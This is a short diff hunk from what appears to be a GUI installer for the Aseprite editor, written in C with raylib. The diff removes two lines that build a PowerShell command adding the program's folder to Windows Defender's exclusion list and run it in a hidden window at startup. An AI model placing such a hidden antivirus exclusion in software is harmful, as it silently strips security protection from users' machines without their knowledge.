@@ -83,8 +83,6 @@ int main() {
     _getcwd(path, sizeof(path));
     Rectangle botao3 = { 320, 350, 150, 70 };
     bool mouseEmCima3 = false;
-    sprintf_s(comando, "powershell -Command \"Add - MpPreference - ExclusionPath '%s'\"", path);
-    WinExec(comando, SW_HIDE);
     InitWindow(x, y, "Instalador Aseprite");
     GuiSetStyle(DEFAULT, TEXT_SIZE, 30);
     SetTargetFPS(60);
